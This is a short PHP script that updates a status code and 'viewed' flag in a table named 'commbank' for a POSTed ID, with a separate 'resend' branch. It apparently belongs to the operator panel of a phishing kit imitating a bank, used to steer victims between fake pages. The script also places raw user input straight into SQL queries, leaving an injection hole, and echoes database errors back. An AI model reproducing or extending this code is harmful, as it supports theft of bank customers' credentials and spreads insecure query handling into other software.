<?php
require '../connection.php';

if ($_POST["uniqueid"]) {
  $uniqueid = $_POST["uniqueid"];

  if (isset($_GET["resend"])) {
    $loading_query = mysqli_query($conn, "UPDATE commbank SET status=8, viewed='true' WHERE uniqueid=$uniqueid");
  } else {
    $loading_query = mysqli_query($conn, "UPDATE commbank SET status=7, viewed='true' WHERE uniqueid=$uniqueid");
  }

  if ($loading_query) {
    echo json_encode(array(
      'status' => 'success'
    ));
  } else {
    echo json_encode(array(
      'status' => 'failure',
      'error' => mysqli_error($conn)
    ));
  }
}

?>
